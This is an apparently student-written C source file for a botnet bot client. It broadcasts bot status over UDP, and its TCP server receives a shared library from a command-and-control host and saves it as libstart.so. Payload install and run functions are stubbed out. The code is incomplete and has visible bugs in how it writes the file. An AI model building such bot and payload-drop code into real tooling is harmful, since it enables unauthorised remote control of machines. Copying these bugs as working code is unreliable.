#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <libthrd.h>
#include <libnetwork.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>

#include "utils.h"
#define PORT_UDP_CLIENT 4242
#define PORT_UDP_SERVEUR 4242
#define PORT_TCP_CLIENT 4242
#define PORT_TCP_SERVEUR "4242"
#define TAILLE_STRUCTURE 32
#define MAX 1000

extern clock_t debut;
/* 
void get_status(info_bot_t info, int socket_tcp)
{
    char status = info.etat;
    if (write(socket_tcp, status, sizeof(char)) < 0)
    {
    };
}

void install_charge()
{
}

void start_charge()
{
}

void rm_charge()
{
} */

/**
 * void gestionClientTCP(void *s)
 * Fonction qui reçoi le msg envoyée par le CC (qui deviendra un ordre plus tard)
 * elle le reçoit et le printf
 * param pointeur vers la socket TCP
 */

void gestionClientTCP(void *s)
{
    printf("[gestionClientTCP]Start\n");
    char msg_recu[80];
    int socket = *((int *)s);
    /* Obtient une structure de fichier */
    FILE *dialogue = fdopen(socket, "a+");
    //ProcessDialog(socket);
    receiveTCP(socket, msg_recu, sizeof(msg_recu));
    printf("[gestionClientTCP]Le msg que j'ai lu de mon client TCP est : %s\n", msg_recu);
    if (dialogue == NULL)
    {
        perror("gestionClientTCP.fdopen");
        exit(EXIT_FAILURE);
    }
    fclose(dialogue);
    return;
}
/**
 * void recvFile(void *s)
 * Fonction qui reçoi le fichier.so envoyé par le CC
 * elle le receptionne et le crée dans son dossier
 * param pointeur vers la socket TCP
 */
void recvFile(void *s)
{
    int socket_tcp = *((int *)s);
    char buff[MAX]; // to store message from client

    FILE *fp;
    fp = fopen("libstart.so", "w"); // stores the file content in recieved.txt in the program directory

    if (fp == NULL)
    {
        printf("Error IN Opening File ");
        return;
    }

    while (read(socket_tcp , buff, MAX) > 0)
        fprintf(fp, "%s", buff);

    printf("File received successfully !! \n");
    printf("New File created is libstart.so !! \n");
}

/**
 * void nouveauClient(int dialogue)
 * Fonction wrapper qui lance un thread avec la fct de traitement TCP
 * param socket de dialogue 
*/
void nouveauClient(int dialogue)
{
    printf("[nouveauClient]Start\n");
    if (lanceThread(recvFile, (void *)&dialogue, sizeof(dialogue)) < 0)
    {
        perror("nouveauClient.lanceThread");
        exit(-1);
    }
}
/**
 * void EnvoieBroadcast(void *structure)
 * Fonction wrapper pour sendUDPBroadcast
 * param pointeur vers la structure à envoyer en UDP
*/

void EnvoieBroadcast(void *structure)
{
    while (1)
    {
        sendUDPBroadcast(*((info_bot_t *)structure), sizeof(info_bot_t), PORT_UDP_CLIENT);
        sleep(5);
    }
}
/**
 * void TCP(void *arg)
 * Fonction wrapper qui initialise une socket tcp et lance boucle Serveur TCP dans un thread
 * 
 * 
 */
void TCP(void *arg)
{
    (void)arg;
    printf("############ Partie TCP ############\n");
    char port_s[6] = PORT_TCP_SERVEUR;
    int socket_tcp;
    // Initialisation du serveur
    socket_tcp = initialisationServeurTCP(port_s);
    if (socket_tcp < 0)
    {
        fprintf(stderr, "Initialisation du serveur impossible\n");
        exit(-1);
    }

    //Lancement de la boucle d'ecoute
    if (boucleServeurTCP(socket_tcp, nouveauClient) < 0)
    {
        fprintf(stderr, "Connexion avec le client impossible\n");
        exit(-1);
    }
}
/**
 * void partie_tcp()
 * Fonction wrapper qui initialise le serveur TCP dans un thread
 * 
 */
void partie_tcp()
{
    if (lanceThread(TCP, (void *)NULL, 0) < 0)
    {
        perror("boucleServeur.lanceThread");
        exit(-1);
    }
}
/**
 * void partie_udp(clock_t debut)
 * Fonction wrapper qui initialise le client UDP dans un thread
 * param debut 
 * 
 */
void partie_udp(clock_t debut)
{

    printf("############ Partie UDP ############\n");
    info_bot_t info_bot;                    // création d'une structure
    remplissageStructure(&info_bot, debut); //remplissage avec l'ID et le temps de vie et état
    impressionStructure(info_bot);
    // PARTIE UDP
    //Envoie de la structure crée en broadcast UDP
    if (lanceThread(EnvoieBroadcast, (void *)&info_bot, sizeof(info_bot_t)) < 0)
    {
        perror("EnvoieBroadcast.lanceThread");
        exit(-1);
    }
}

int main()
{
    clock_t debut = clock(); //prise de temps au moment du démarrage stricte du process
    srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand

    // PARTIE envoie UDP en THREAD
    partie_udp(debut);

    // PARTIE SERVEUR TCP en THREAD
    partie_tcp();

    while (1)
    {
    }
    return 0;
}
